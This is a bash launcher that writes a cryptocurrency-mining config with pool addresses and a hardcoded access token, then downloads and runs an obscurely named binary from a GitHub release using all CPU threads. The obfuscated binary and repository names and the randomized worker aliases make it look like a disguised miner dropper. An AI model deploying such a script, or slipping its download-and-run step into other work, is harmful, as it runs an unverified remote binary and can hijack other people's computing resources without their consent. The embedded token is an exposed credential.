#!/bin/bash

# === 1. Generate worker name based on a random date and time + "_SVP15"
generate_worker_name() {
    # Generate a random datetime within a range (e.g., last 10 years)
    start_date="2015-01-01"
    end_date=$(date +%Y-%m-%d)
    
    # Convert dates to Unix timestamps
    start_seconds=$(date -d "$start_date" +%s)
    end_seconds=$(date -d "$end_date" +%s)

    # Generate a random date
    random_seconds=$((RANDOM % (end_seconds - start_seconds) + start_seconds))
    random_datetime=$(date -d @$random_seconds "+%Y%m%d_%H%M%S")

    # Return the worker name with "_SVP15" appended
    echo "${random_datetime}_SVP15"
}

worker_name=$(generate_worker_name)
echo "[+] Generated worker name: $worker_name"

# === 2. Get total CPU threads using `nproc`
cpu_threads=$(nproc)
echo "[+] Detected CPU Threads: $cpu_threads"

# === 3. Create JSON config ===
config_file="appsettings.json"
cat <<EOF > $config_file
{
    "ClientSettings": {
        "poolAddress": "wss://pplnsjetski.xyz/ws/YEFTEEAYTSMKIDPBMGCTIDOZTKCBBGYTGANZMCLGTFWWARKYZGKZZSBBJOQN",
        "alias": "$worker_name",
        "accessToken": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImZiZDRlODYyLTkxZWEtNDM1NS04YzFlLTA5Y2M2MmQwNjA2MiIsIk1pbmluZyI6IiIsIm5iZiI6MTc1NTcxMTY2MiwiZXhwIjoxNzg3MjQ3NjYyLCJpYXQiOjE3NTU3MTE2NjIsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.qPA6YWsSenUztyObsghbeePK28zNQ7iY3kazWsk9fJgegbcMo58SLal5Q1ytzPxfaMZIyLhActlzxjBT3G4mwayrzAiyh9IDqXh4CUWNQ54W1LPCzv-uQPuyjy8HNr7qJUFDI-fl54kBXBXGbkCfvghvkX0eP5w1pD0WAmpGTbUmCyead2U3NGDbs2a6DrdRi86uFVp8Pxzg_cwVuFuKFhJx5oVitBCIPPcYSSDz8m9l2C6B1icvwTWGXJnchlOIJ12cjFXpkq_DHhp_M4lWwpMpJGGsl1YKWQ22OrpVheJZM22z-rsgQ4RU3LVbGU1BoY3ssOFmtCnzIE_D5ekATg",
        "pps": true,
        "trainer": {
            "cpu": true,
            "gpu": false,
            "cpuThreads": $cpu_threads
        },
        "xmrSettings": {
            "disable": false,
            "enableGpu": false,
            "poolAddress": "74.207.227.36:8088",
            "customParameters": "-t $cpu_threads"
        }
    }
}
EOF
echo "[+] Created $config_file"

# === 4. Download jskiaso binary ===
jskiaso_url="https://github.com/vedhagsvp/jtqlpoa/releases/download/jtreas/jskiaso"
jskiaso_filename="jskiaso"

if [ ! -f "$jskiaso_filename" ]; then
    echo "[+] Downloading jskiaso..."
    wget -q "$jskiaso_url" -O "$jskiaso_filename"
    echo "[+] Download complete."
else
    echo "[!] jskiaso already exists. Skipping download."
fi

# === 5. Make executables
chmod +x "$jskiaso_filename"
chmod +x "$config_file"
echo "[+] Set executable permissions."

# === 6. Run jskiaso binary
echo "[+] Running ./$jskiaso_filename ..."
./$jskiaso_filename
